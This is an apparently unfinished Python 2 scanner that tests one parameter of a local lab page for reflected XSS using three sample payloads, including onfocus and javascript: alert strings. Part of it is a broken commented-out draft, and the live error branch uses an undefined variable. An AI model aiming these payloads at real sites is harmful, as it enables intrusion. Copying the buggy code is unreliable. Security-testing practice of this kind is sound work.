# coding:utf-8
import requests
from urlparse import urlparse 

payloads = ['<svg "ons>', '" onfocus="alert(1);', 'javascript:alert(1)']
alert = "<script>aleert(1)</script>"
url = "http://127.0.0.1:8091/level1.php?name=1*&as=1"

if requests.get(url).status_code == 200:
    pass 
else :
    print "url无法访问 响应码为%d" % (r.status_code)
    exit(0)

vuln = False

for i in payloads:
    gen_url=url.replace("*",i)
    if i in requests.get(gen_url).text.encode("utf-8"):
        vuln = True
        break


if vuln:
    print "%s 存在xss，验证POC为 %s" % (url,gen_url)

# def param_parse(url):
#     if not url.startswith("http://") or not url.startswith("https://"):
#         url = "http://" + url 
#     urled = urlparse(url)
#     param=urled.query.split("&")
#     params = dict()
#     for i in param:
#         query_key = i.split("=")[0]
#         query_value = i.split("=")[1]
#         params[query_key] = query_value
#     # return params
#     _URL = dict()
#     _URL["scheme"] = urled.scheme
#     _URL["host"] = urled.netloc
#     _URL["path"] = urled.path
#     _URL["param_list"] = params
#     return _URL

# Parse_url = param_parse(url)

# if len(Parse_url["param_list"]) >= 1:
#     for u in Parse_url["param_list"]:
#         for i in payloads:
#             Parse_url["param_list"][u] = i 
#             query = "%s=%s" % (k,v for k in )
#             gen_url = Parse_url["scheme"] + "://" + Parse_url["host"] + Parse_url["path"] + "?" + u + "=" + i + other_query
#             if i in requests.get(gen_url).text.encode("utf-8"):
#                 print "%s is vul" % (url)